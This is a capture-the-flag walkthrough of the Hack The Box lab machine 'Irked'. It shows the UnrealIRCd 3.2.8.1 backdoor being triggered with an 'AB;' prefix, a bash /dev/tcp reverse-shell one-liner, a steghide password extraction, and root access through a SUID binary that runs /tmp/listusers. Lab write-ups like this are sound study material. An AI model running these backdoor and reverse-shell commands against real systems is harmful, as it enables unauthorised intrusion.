# Irked
```
Difficulty: Easy
Operating System: Linux
Hints: True
```

### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
|:---|:---|:---|:---|
| 1 | `ircd` | UnrealIRCd Backdoor Command Execution (CVE-2010-2075) | Found an UnrealIRCd service running on multiple ports. Discovered that a backdoor was present in version `3.2.8.1`, allowing for remote command execution by prepending a command with "AB". Used this to get a reverse shell as the `ircd` user. |
| 2 | `djmardov` | Steganography & Password Re-use | Discovered a hidden file `.backup` in `djmardov`'s home directory containing a password clue (`UPupDOWNdownLRlrBAbaSSss`) and referencing a "steg backup". Used `steghide` with this password on an image found on the web server to extract a second password. Used this password to log in via SSH as the `djmardov` user. |
| 3 | `root` | SUID Binary & Path Hijacking | Discovered an unusual SUID binary named `viewuser`. When executed, the binary attempted to run `/tmp/listusers` as `root` without specifying the full path. By creating a malicious script at `/tmp/listusers` containing a reverse shell, the `viewuser` binary executed the script with root privileges, granting a root shell. |


## Initial Enumeration
Running nmap full scan (TCP) on the target shows the following
```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey:
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          37615/udp   status
|   100024  1          50004/tcp   status
|   100024  1          51408/udp6  status
|_  100024  1          53157/tcp6  status
6697/tcp  open  irc     UnrealIRCd
8067/tcp  open  irc     UnrealIRCd
50004/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Now, let's dig into port 80.  
Here we can only see a smile picture and a comment: *IRC is almost working!*  
Now, we thanks for the hint and we dig into UnrealIRCd service.  
Before doing so, let's reat the IRC RFC and see how we can connect to the server and provide all the needed information.  
In the [RFC-1459](https://datatracker.ietf.org/doc/html/rfc1459) we can navigate to [Connection Registration](https://datatracker.ietf.org/doc/html/rfc1459#section-4.1) and as we can discover how to connect sending the NICK, PASS, USER commands as follows:  
```
[root@kali Irked ]$ nc 10.10.10.117 6697
:irked.htb NOTICE AUTH :*** Looking up your hostname...
NICK b0d
USER:irked.htb NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
PASS b0d
USER b0d 0 * :b0d
:irked.htb 001 b0d :Welcome to the ROXnet IRC Network b0d!b0d@10.10.14.18
:irked.htb 002 b0d :Your host is irked.htb, running version Unreal3.2.8.1
:irked.htb 003 b0d :This server was created Mon May 14 2018 at 13:12:50 EDT
:irked.htb 004 b0d irked.htb Unreal3.2.8.1 iowghraAsORTVSxNCWqBzvdHtGp lvhopsmntikrRcaqOALQbSeIKVfMCuzNTGj
```
As we can see here, the server discloses service version information: ```Unreal3.2.8.1```.
So by just googling around for a changelog, we can see that exploits pop up.  
So without further doing let's searchsploit for unreal ircd:  
```
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
UnrealIRC 3.2.8.1 - Backdoor Command Execution (Metasploit)                                                                                                                                               | linux/remote/16922.rb
UnrealIRC 3.2.8.1 - Local Configuration Stack Overflow                                                                                                                                                    | windows/dos/18011.txt
UnrealIRC 3.2.8.1 - Remote Downloader/Execute                                                                                                                                                             | linux/remote/13853.pl
UnrealIRC 3.x - Remote Denial of Service                                                                                                                                                                  | windows/dos/27407.pl
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
Now' let's dig deeper into ```UnrealIRC 3.2.8.1 - Backdoor Command Execution```.  
There is a metasploit module for this, but as always, we avoid to use metasploit and instead understand how the exploit works and try to exploit the service manually.  
Since the exploit url reference is giving a 404, we can use [this link](https://lwn.net/Articles/392201/) to learn more about this vulnerability.
As we can see:
```
The backdoor was disguised to look like a debug statement in the code:

   #ifdef DEBUGMODE3
    if (!memcmp(readbuf, DEBUGMODE3_INFO, 2))
        DEBUG3_LOG(readbuf);
   #endif

DEBUG3_LOG eventually resolves to a call to system(), while DEBUGMODE3_INFO is just the string "AB". Thus commands sent to the server that start with "AB" will be handed off directly to system().
```
So, now let's try to exploit this manually.

## User
Once we learned about the vulnerability, let's test if this effectively works on the system:
```
[root@kali Irked ]$ echo "AB; ping -c1 10.10.14.18" | nc 10.10.10.117 8067
:irked.htb NOTICE AUTH :*** Looking up your hostname...
:irked.htb NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
:irked.htb 451 AB; :You have not registered
```
While on our machine launch a tcpdump on the vpn interface:
```
[root@kali exploits ]$ tcpdump -ettti tun0 icmp and not udp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 00:00:00.000000 ip: irked.htb > 10.10.14.18: ICMP echo request, id 1405, seq 1, length 64
 00:00:00.000032 ip: 10.10.14.18 > irked.htb: ICMP echo reply, id 1405, seq 1, length 64
```
As we can see we recived a ping request message from irked.htb, so this means that the backdoor is working and it's executing commands.  
So now, let's try to get a shell:  
```
[root@kali Irked ]$ echo "AB; bash -c 'bash -i >& /dev/tcp/10.10.14.18/4444 0>&1'" | nc 10.10.10.117 8067
:irked.htb NOTICE AUTH :*** Looking up your hostname...
:irked.htb NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
```
And now we get a shell as irked:
```
root@kali:~/Documents/HTB/Boxes/Irked/exploits# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.18] from (UNKNOWN) [10.10.10.117] 56955
bash: cannot set terminal process group (633): Inappropriate ioctl for device
bash: no job control in this shell
ircd@irked:~/Unreal3.2$
```
If we navigate to home directory, we can see that there is no user flag inside ircd directory, but instead there is another user called djmardov.  
Obviously we cannot read the flag user.txt, but while enumerating permission, something intresting pop up: a .backup file inside the Documents directory:
```
ircd@irked:/home/djmardov$ ls -ltra *
[... SNIP ...]

Documents:
total 16
-rw-------  1 djmardov djmardov   33 May 15  2018 user.txt
drwxr-xr-x  2 djmardov djmardov 4096 May 15  2018 .
-rw-r--r--  1 djmardov djmardov   52 May 16  2018 .backup
drwxr-xr-x 18 djmardov djmardov 4096 Nov  3  2018 ..
```
if we examine the file, we can see:
```
ircd@irked:/home/djmardov/Documents$ cat .backup
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```
Since this refers to a 'steg' backup password, and the only image we've seen so far is the smile face in the webroot, we can try to run steghide and extract the secret from the image using the discovered password (Steghide is a tool commonly used in CTF challenges).  
```
[root@kali Irked ]$ steghide extract -p UPupDOWNdownLRlrBAbaSSss -sf irked.jpg
wrote extracted data to "pass.txt".
[root@kali Irked ]$ cat pass.txt           
Kab6h+m+bbp2J:HG
```  
Now, let's try to ssh as djmardov using the discovered password.  
```
[root@kali exploits ]$ ssh $TARGET -l djmardov
djmardov@10.10.10.117's password:

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue May 15 08:56:32 2018 from 10.33.3.3

djmardov@irked:~$
```
And now we owned user.

## Root
After we login as djmardov, as usual we can run ```linpeas.sh```.  
As we can see there is au uncommon SUID file ```viewuser```.
```
════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════
╔══════════╣ SUID - Check easy privesc, exploits and write perms                 
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
strace Not Found                                           
[... SNIP ...]
-rwsr-xr-x 1 root root 52K May 17  2017 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 7.2K May 16  2018 /usr/bin/viewuser (Unknown SUID binary)
```
Let's try to run viewsuser and see what this is for.  
```
djmardov@irked:~$ viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           Dec 17 03:42 (:0)
djmardov pts/1        Dec 17 17:19 (10.10.14.18)
sh: 1: /tmp/listusers: not found
```
Seems like this file is executing via sh ```/tmp/listusers```.  
Since ltrace is not installed on the box, let's download this using b64 endode and then decode to generate the binary.  
Now, let's run ltrace:
```
__libc_start_main(0x565f857d, 1, 0xfff469c4, 0x565f8600 <unfinished ...>
puts("This application is being devleo"...This application is being devleoped to set and test user permissions
)                                                                                                        = 69
puts("It is still being actively devel"...It is still being actively developed
)                                                                                                        = 37
system("who"root     tty7         2021-12-17 09:40 (:0)
root     pts/1        2021-12-17 23:24 (tmux(4033).%12)
root     pts/2        2021-12-17 23:12 (tmux(4033).%10)
root     pts/3        2021-12-17 23:20 (tmux(4033).%11)
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                                             = 0
setuid(0)                                                                                                                                          = 0
system("/tmp/listusers"sh: 1: /tmp/listusers: not found
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                                             = 32512
+++ exited (status 0) +++
```
As we can see, after setuid(0) a system call is executed, requesting the execution (as root) of /tmp/listusers.  
Now we can take advantage of this simply by creating the following file:  
```
djmardov@irked:~$ cat /tmp/listusers
#!/bin/bash
/bin/bash
djmardov@irked:~$ viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           Dec 20 03:05 (:0)
djmardov pts/0        Dec 20 04:04 (10.10.14.18)
root@irked:~# id
uid=0(root) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)
```

Since we are curious, we want to extract from the binary the original source.  
To do so, let's use ghidra.  
Let's create a progect -> Click the Dragon -> Import Project.  
On the side Symbol Tree -> Main.  
And as we can see from the output below, we can recover the original code.  
```
undefined4 main(void)

{
  puts("This application is being devleoped to set and test user permissions");
  puts("It is still being actively developed");
  system("who");
  setuid(0);
  system("/tmp/listusers");
  return 0;
}
```
